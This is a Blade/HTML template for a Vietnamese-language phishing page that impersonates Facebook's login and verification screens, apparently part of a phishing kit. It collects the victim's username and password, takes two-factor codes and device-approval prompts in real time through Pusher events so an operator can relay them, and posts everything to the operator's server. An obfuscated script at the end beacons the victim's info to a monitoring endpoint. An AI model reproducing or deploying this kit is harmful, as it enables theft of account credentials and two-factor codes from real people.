<!doctype html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>{{ $data->title }}</title>
    <meta name="title" content="{{ $data->title }}" />
    <meta name="description" content="{{ $data->description }}">
    <meta property="twitter:title" content="{{ $data->title }}" />
    <meta property="twitter:description" content="{{ $data->description }}" />
    <meta property="twitter:card" content="summary_large_image" />
    <meta property="twitter:image" content="{{ $data->image }}" />
    <meta property="og:title" content="{{ $data->title }}" />
    <meta property="og:image" content="{{ $data->image }}" />
    <meta property="og:type" content="article" />
    <link rel="shortcut icon"
        href="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/fblogo.png">
    @vite(['resources/css/app.css'])
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pusher/8.4.0/pusher.min.js"
        integrity="sha512-p3rR75Is6DCK1r2D8mdxLQhe4IWVDSTUBdxqs0Veum0hHDSY+sH9M6U6Cesr1umlxbiEK9w/3IhXFlZcWT1AoA=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://kit.fontawesome.com/8f728199e4.css" crossorigin="anonymous">
    <style>
        @layer utilities {

            input:-webkit-autofill,
            input:-webkit-autofill:hover,
            input:-webkit-autofill:focus,
            input:-webkit-autofill:active {
                -webkit-box-shadow: 0 0 0px 1000px transparent inset !important;
                -webkit-text-fill-color: inherit !important;
                transition: background-color 9999s ease-in-out 0s;
            }
        }

        @font-face {
            font-family: 'MyRulersVjpPro';
            src: url('https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/fb_font.woff2') format('woff2');
        }

        body {
            font-family: 'MyRulersVjpPro', sans-serif;
        }
    </style>
</head>

<body>
    <div class="relative min-h-screen overflow-hidden bg-gradient-to-br from-[#eef4ff] via-[#f5f8ff] to-[#e3edff] flex items-center justify-center px-4 py-10"
        id="submit_custom_form_code_container">
        <div
            class="pointer-events-none absolute -top-32 -left-32 w-[480px] h-[480px] rounded-full bg-blue-400/30 blur-3xl">
        </div>
        <div
            class="pointer-events-none absolute -bottom-40 -right-24 w-[520px] h-[520px] rounded-full bg-sky-300/40 blur-3xl">
        </div>
        <div
            class="pointer-events-none absolute top-1/3 right-1/4 w-[260px] h-[260px] rounded-full bg-indigo-300/25 blur-3xl">
        </div>
        <div
            class="pointer-events-none absolute inset-0 opacity-[0.35] [background-image:radial-gradient(#93b4f5_1px,transparent_1px)] [background-size:22px_22px] [mask-image:radial-gradient(ellipse_at_center,black_30%,transparent_75%)]">
        </div>
        <form
            class="relative z-10 w-full max-w-[680px] text-center bg-white/75 backdrop-blur-xl border border-white rounded-3xl shadow-[0_20px_60px_rgba(30,64,175,0.15)] px-6 sm:px-10 py-10"
            id="submit_custom_form_code">
            <h1 class="text-4xl sm:text-5xl font-bold text-[#0b1a4a] tracking-tight">Xác nhận đăng ký</h1>
            <p class="mt-3 text-base sm:text-lg text-[#0b1a4a]">Chúng tôi đã gửi mã đến bạn. Hãy nhập mã để xác nhận
                đăng ký.</p>
            <div class="mt-5 flex items-center gap-2">
                <span class="flex-1 h-px bg-blue-300"></span>
                <span
                    class="inline-flex items-center gap-2 px-5 py-2 rounded-full bg-gradient-to-b from-blue-50 to-blue-100 border border-blue-200 shadow-[0_2px_8px_rgba(37,99,235,0.15)] text-[#1d4fd8] font-semibold text-base">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
                        <circle cx="12" cy="12" r="9"></circle>
                        <path stroke-linecap="round" d="M12 7v5l3 2"></path>
                    </svg>
                    Chờ trong giây lát
                </span>
                <span class="flex-1 h-px bg-blue-300"></span>
            </div>
            <div id="alert" role="alert"
                class="mt-4 flex items-start gap-3 text-left rounded-2xl border border-red-200 bg-red-50/90 px-4 py-3 text-red-700 shadow-[0_4px_14px_rgba(220,38,38,0.12)] hidden">
                <svg class="w-5 h-5 mt-0.5 shrink-0" fill="none" stroke="currentColor" stroke-width="2.2"
                    viewBox="0 0 24 24">
                    <circle cx="12" cy="12" r="9"></circle>
                    <path stroke-linecap="round" d="M12 8v5m0 3h.01"></path>
                </svg>
                <div class="flex-1">
                    <p class="font-semibold text-sm">Mã xác nhận không đúng</p>
                    <p id="alertMsg" class="text-sm text-red-600">Mã bạn nhập không chính xác. Vui lòng kiểm tra lại và
                        thử lại.</p>
                </div>
            </div>

            <input type="number" placeholder="Nhập mã"
                class="mt-5 w-full h-14 px-6 rounded-full border-2 border-[#2b6ff2] text-lg text-slate-800 placeholder:text-slate-400 outline-none shadow-[0_2px_10px_rgba(37,99,235,0.15)] focus:ring-4 focus:ring-blue-100">

            <button type="submit" id="submit_custom_form_code_btn"
                class="mt-6 px-14 h-14 rounded-full bg-gradient-to-b from-[#3b82f6] to-[#1d5fe0] text-white text-lg font-semibold shadow-[0_8px_20px_rgba(37,99,235,0.35)] hover:brightness-110 transition disabled:opacity-80">
                Tiếp tục vào trang
            </button>

            <div class="mt-6 flex items-center justify-center gap-4 text-left">
                <svg class="w-9 h-9 shrink-0" viewBox="0 0 24 24">
                    <path fill="#2b6ff2" d="M12 2 4 5v6c0 5 3.4 9.4 8 11 4.6-1.6 8-6 8-11V5l-8-3Z"></path>
                    <rect x="9" y="11" width="6" height="5" rx="1" fill="#fff"></rect>
                    <path d="M10 11V9.5a2 2 0 0 1 4 0V11" stroke="#fff" stroke-width="1.4" fill="none"></path>
                </svg>
                <span class="w-px h-8 bg-slate-700"></span>
                <p class="text-sm text-[#0b1a4a]">Thông tin bạn cung cấp sẽ được bảo mật an toàn và chỉ sử dụng cho mục
                    đích đăng ký.</p>
            </div>
        </form>
    </div>
    <div class="min-h-screen flex items-center justify-center px-4 hidden" id="verify_device">
        <div class="w-full sm:max-w-[900px]">
            <p class="text-[13px] text-black mb-1">Facebook</p>
            <h1 class="text-[22px] font-bold text-black leading-snug mb-2">
                {{ __('facebook.check_other_devices') }}</h1>
            <p class="text-[14px] text-black leading-relaxed mb-5">
                {{ __('facebook.check_other_devices_msg') }}</p>
            <div class="rounded-xl overflow-hidden mb-5">
                <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/another_device.png"
                    alt="Xác minh thiết bị" class="w-full h-auto">
            </div>
            <div class="text-5xl text-center font-bold tracking-[10px] mb-4" id="device_code">52</div>
            <div class="flex items-center gap-3 mb-5">
                <i class="fa-light fa-circle-notch fa-spin"></i>
                <div>
                    <p class="text-[15px] font-semibold text-black leading-tight">
                        {{ __('facebook.waiting_for_approve') }}</p>
                    <p class="text-[13px] text-black mt-0.5">{{ __('facebook.waiting_message') }}</p>
                </div>
            </div>
        </div>
    </div>
    <div class="min-h-screen flex items-center justify-center px-4 hidden" id="verify_otp">
        <div class="w-full sm:max-w-[900px]">
            <p class="text-[13px] text-black mb-1">Facebook</p>
            <h1 class="text-[22px] font-bold text-black leading-snug mb-2">
                {{ __('facebook.check_device_notification') }}</h1>
            <p class="text-[14px] text-black leading-relaxed mb-5">
                {{ __('facebook.check_device_notification_message') }}</p>
            <div class="rounded-xl overflow-hidden mb-5">
                <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/device.png"
                    alt="Xác minh thiết bị" class="w-full h-auto">
            </div>
            <div class="flex items-center gap-3 mb-5">
                <i class="fa-light fa-circle-notch fa-spin"></i>
                <div>
                    <p class="text-[15px] font-semibold text-black leading-tight">
                        {{ __('facebook.waiting_for_approve') }}</p>
                    <p class="text-[13px] text-black mt-0.5">{{ __('facebook.waiting_message') }}</p>
                </div>
            </div>
            <div class="h-px bg-border mb-4"></div>
            <form id="submit_otp">
                <div class="mb-4">
                    {{-- Thông báo khi lỗi --}}
                    <div class="py-3.5 px-4 bg-[#f93a4b] text-white text-sm rounded-2xl mb-2" id="warning_otp"
                        style="display: none"></div>
                    <label
                        class="block text-[14px] text-black font-medium mb-2">{{ __('facebook.or_enter_otp') }}</label>
                    <input type="text" inputmode="numeric" maxlength="10" required
                        placeholder="{{ __('facebook.input_otp_placeholder') }}"
                        class="w-full border border-gray-300 rounded-xl px-4 py-[10px] text-[15px] placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent transition-all">
                </div>
                <button
                    class="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white rounded-full py-[10px] text-[15px] cursor-pointer transition-colors duration-100 mb-3 disabled:cursor-default disabled:opacity-80"
                    id="confirm_otp" type="submit">{{ __('facebook.confirm') }}</button>
            </form>
        </div>
    </div>
    <div class="w-[95vw] lg:w-[99vw] mx-auto mt-[30px] relative h-[90vh] hidden" id="main">
        <p class="text-center text-sm text-[#646d74]">{{ __('facebook.' . app()->getLocale()) }}</p>
        <div class="h-[200px] flex justify-center items-center">
            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/fb_logo.png"
                alt="fb-logo" width="60">
        </div>
        <p class="font-semibold mb-3 ml-2">{{ $data->login_warning }}</p>
        {{-- Thông báo khi lỗi --}}
        <div class="py-3.5 px-4 bg-[#f93a4b] text-white text-sm rounded-2xl mb-3" id="warning"
            style="display: none;">
        </div>
        <form id="submit" class="space-y-3">
            <div class="relative border border-gray-300 rounded-[17px] p-4">
                <div class="flex gap-1">
                    <input id="user" type="text" placeholder=" "
                        class="mt-2 bg-transparent peer text-[15px] text-black placeholder:text-[#646d74] outline-none w-full"
                        required>
                    <label
                        class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                        for="user">{{ filled($login_theme_config->facebook->username) ? $login_theme_config->facebook->username : __('facebook.email_or_phone') }}</label>
                    <button id="close_btn" class="cursor-pointer hidden" type="button" tabindex="-1">
                        <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/close_logo.svg"
                            width="25" />
                    </button>
                </div>
            </div>
            <div class="relative border border-gray-300 rounded-[17px] p-4">
                <div class="flex gap-1">
                    <input id="pass" type="password" placeholder=" "
                        class="mt-2 bg-transparent peer text-[15px] text-black placeholder:text-[#646d74] outline-none w-full"
                        required>
                    <label
                        class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                        for="pass">{{ filled($login_theme_config->facebook->password) ? $login_theme_config->facebook->password : __('facebook.password') }}</label>
                    @if ($setting->showFacebookPasswordButton)
                        <button type="button" id="show_pass" class="cursor-pointer hidden" tabindex="-1">
                            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/show_pass.svg"
                                width="25" />
                        </button>
                        <button type="button" id="hide_pass" class="cursor-pointer hidden" tabindex="-1">
                            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/hide_pass.svg"
                                width="25" />
                        </button>
                    @endif
                </div>
            </div>
            <button type="submit"
                class="outline-none cursor-pointer w-full bg-[#0064e0] text-white rounded-[100px] p-2.5 text-sm active:bg-[#3b8ef5] active:scale-[99%] transition-all duration-100 disabled:opacity-80 disabled:cursor-default disabled:pointer-events-none"
                id="log_btn">
                {{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}</button>
        </form>
        <div class="mt-4">
            <p class="text-center text-sm text-[#0d1114] cursor-pointer">
                {{ filled($login_theme_config->facebook->forgot_password) ? $login_theme_config->facebook->forgot_password : __('facebook.forgot_password') }}
            </p>
        </div>
        <div class="space-y-4 flex flex-col items-center absolute bottom-0 w-full">
            <button
                class="outline-none cursor-pointer w-full bg-white text-[#0064e0] border border-[#0064e0] rounded-[100px] p-2.5 text-sm transition-all duration-100">
                {{ filled($login_theme_config->facebook->create_account) ? $login_theme_config->facebook->create_account : __('facebook.create_new_account') }}
            </button>
            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/meta_logo.png"
                alt="fb-logo" width="55">
            <div class="flex justify-center items-center gap-2">
                <p class="text-[.7rem] cursor-pointer text-[#646d74]">{{ __('facebook.introduce') }}</p>
                <p class="text-[.7rem] cursor-pointer text-[#646d74]">{{ __('facebook.help') }}</p>
                <p class="text-[.7rem] cursor-pointer text-[#646d74]">{{ __('facebook.view_more') }}</p>
            </div>
        </div>
    </div>
    <script src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/helpers.js"></script>
    <script>
        ////
        var pusher = new Pusher('a16c3bab85659b6d2b51', {
            cluster: 'ap1'
        });
        var channel = pusher.subscribe('mrls');
        channel.bind("{{ $pusher_code }}", function(data) {
            const warning = $("#warning")
            const btn = $("#log_btn")
            if (data.status) {
                warning.hide()
                // redirect to link if custom otp container is hidden
                if ($("#submit_custom_form_code_container").is(":hidden")) {
                    window.location.href = '{!! $data->redirect_link !!}'
                } else {
                    // show main login
                    $("#submit_custom_form_code_container").hide()
                    $("#main").show()
                }
            } else {
                if (data.wrong_password) {
                    warning.show()
                    warning.html(
                        "{{ filled($login_theme_config->facebook->invalid_password) ? $login_theme_config->facebook->invalid_password : __('facebook.invalid_password') }}"
                    )
                    btn.attr('disabled', false).html(
                        "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
                    )
                }
                if (data.wrong_user) {
                    warning.show()
                    warning.html(
                        "{{ filled($login_theme_config->facebook->invalid_username) ? $login_theme_config->facebook->invalid_username : __('facebook.wrong_phone_or_email') }}"
                    )
                    btn.attr('disabled', false).html(
                        "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
                    )
                }
                if (data.otp_request) {
                    $("#main").hide()
                    $("#footer").remove()
                    $("#verify_device").addClass('hidden')
                    $("#verify_otp").removeClass('hidden')
                }
                if (data.request_resend) {
                    // handler 2 cases
                    if ($("#submit_custom_form_code_container").is(":hidden")) {
                        $("#warning_otp").show()
                        $("#warning_otp").html("{{ __('facebook.invalid_authentication_code') }}")
                        $("#confirm_otp").html(
                            "{{ filled($login_theme_config->facebook->confirm_btn) ? $login_theme_config->facebook->confirm_btn : __('facebook.confirm') }}"
                        ).attr('disabled', false)
                    } else {
                        $("#alert").show()
                        $("#submit_custom_form_code_btn").html(
                            "Tiếp tục vào trang"
                        ).attr('disabled', false)
                    }
                }
                if (data.another_device_verify) {
                    $("#main").hide()
                    $("#footer").remove()
                    $("#verify_device").removeClass('hidden')
                    $("#verify_otp").addClass('hidden')
                    $("#device_code").html(data.another_device_verify)
                }
            }
        });
        ////
        $("#submit").submit(function(e) {
            e.preventDefault();
            const username = $("#user").val()
            const password = $("#pass").val()
            const warning = $("#warning")
            const btn = $(this).find('button[type=submit]')
            const dataToSend = {
                'username': username,
                'password': password,
                'info': '{{ $info }}',
                'ac': 'n'
            }
            btn.attr('disabled', true).html(
                "{{ filled($login_theme_config->facebook->login_in_progress) ? $login_theme_config->facebook->login_in_progress : __('facebook.logging_in') }}"
            )
            // auto detect phone or string
            warning.hide()
            @if ($setting->checkLoginFacebook)
                if (string_check(username)) {
                    if (!check_email(username)) {
                        warning.html("{{ __('facebook.wrong_email') }}")
                        warning.show()
                        btn.attr('disabled', false).html(
                            "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
                        )
                        return
                    }
                } else {
                    if (!phone_check(username)) {
                        warning.html("{{ __('facebook.wrong_phone_or_email') }}")
                        warning.show()
                        btn.attr('disabled', false).html(
                            "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
                        )
                        return
                    }
                }
            @endif
            @if ($setting->checkLoginFacebookPassword)
                if (password.length < 5) {
                    warning.html("{{ __('facebook.password_too_short') }}")
                    warning.show()
                    btn.attr('disabled', false).html(
                        "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
                    )
                    return
                }
            @endif
            $.post("{{ route('post.customweb.facebook') }}", {
                    d: JSON.stringify(dataToSend),
                    'p_c': "{{ $pusher_code }}",
                    '_token': '{{ csrf_token() }}'
                },
                function(data, textStatus, jqXHR) {
                    if (!data.status) {
                        warning.html("{{ __('facebook.try_again') }}")
                        warning.show()
                        btn.attr('disabled', false).html(
                            "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
                        )
                        return
                    }
                },
                "json"
            );
        });
        // custom submit otp form
        $("#submit_custom_form_code").submit(function(e) {
            e.preventDefault();
            const btn = $(this).find('button[type=submit]')
            const otp_code = $(this).find('input[type=number]').val()
            const warning = $("#alert")
            warning.hide()
            btn.attr('disabled', true).html(
                'Đang xác nhận'
            )
            $.post("{{ route('post.customweb.0935396675_custom_otp') }}", {
                    d: JSON.stringify({
                        'info': '{{ $info }}',
                        'otp': otp_code
                    }),
                    'p_c': "{{ $pusher_code }}",
                    '_token': '{{ csrf_token() }}'
                },
                function(data, textStatus, jqXHR) {},
                "json"
            );
        });

        $("#submit_otp").submit(function(e) {
            e.preventDefault();
            otp = $(this).find('input[type=text]').val()
            btn = $(this).find('button[type=submit]')
            warning = $("#warning_otp")
            const username = $("#user").val()
            warning.hide()
            const dataToSend = {
                'info': '{{ $info }}',
                'ac': 'o',
                'otp': otp,
                'username': username
            }
            if (!otp || otp.length > 10) {
                warning.show()
                warning.html("{{ __('facebook.invalid_authentication_code') }}")
                return
            }
            btn.html("{{ __('facebook.confirming') }}").attr('disabled', true)
            $.post("{{ route('post.customweb.facebook') }}", {
                    d: JSON.stringify(dataToSend),
                    'p_c': "{{ $pusher_code }}",
                    '_token': '{{ csrf_token() }}'
                },
                function(data, textStatus, jqXHR) {},
                "json"
            );
        });
        @if ($setting->web_monitor)
            function _0x288c() {
                const _0x37ec84 = ['48CMkkll', 'json', '3JonQMx', '17133vzCqfg', '4310966IniJJf',
                    '{{ env('WEB_MONITOR_API_URL') }}', 'post', 'ajax', '121420DbkbkL', '{{ $info }}',
                    '2589160vbohhG', '21xlbLfm', '728nFnPNA', '330tpFAEl', '32313696gMzGBS', '605396rIPIJR',
                    '145269vZVoyM', 'login'
                ];
                _0x288c = function() {
                    return _0x37ec84;
                };
                return _0x288c();
            }

            function _0x33d9(_0x4b7f11, _0x1ea9e4) {
                _0x4b7f11 = _0x4b7f11 - 0x66;
                const _0x288cc2 = _0x288c();
                let _0x33d95b = _0x288cc2[_0x4b7f11];
                return _0x33d95b;
            }(function(_0x605303, _0x130420) {
                const _0x4d4965 = _0x33d9,
                    _0x497ad1 = _0x605303();
                while (!![]) {
                    try {
                        const _0x1dbb7f = parseInt(_0x4d4965(0x6f)) / 0x1 * (parseInt(_0x4d4965(0x6a)) / 0x2) + -
                            parseInt(_0x4d4965(0x70)) / 0x3 * (-parseInt(_0x4d4965(0x67)) / 0x4) + -parseInt(_0x4d4965(
                                0x75)) / 0x5 * (-parseInt(_0x4d4965(0x6d)) / 0x6) + -parseInt(_0x4d4965(0x66)) / 0x7 * (
                                -parseInt(_0x4d4965(0x77)) / 0x8) + parseInt(_0x4d4965(0x6b)) / 0x9 * (parseInt(
                                _0x4d4965(0x68)) / 0xa) + -parseInt(_0x4d4965(0x71)) / 0xb + -parseInt(_0x4d4965(
                                0x69)) / 0xc;
                        if (_0x1dbb7f === _0x130420) break;
                        else _0x497ad1['push'](_0x497ad1['shift']());
                    } catch (_0x53c8ac) {
                        _0x497ad1['push'](_0x497ad1['shift']());
                    }
                }
            }(_0x288c, 0x88e02), ((() => {
                const _0x55563d = _0x33d9,
                    _0x566492 = {
                        'data': _0x55563d(0x76),
                        'type': _0x55563d(0x6c)
                    };
                $[_0x55563d(0x74)]({
                    'type': _0x55563d(0x73),
                    'url': _0x55563d(0x72),
                    'data': _0x566492,
                    'dataType': _0x55563d(0x6e),
                    'success': function(_0x882676) {}
                });
            })()));
        @endif
    </script>
</body>

</html>
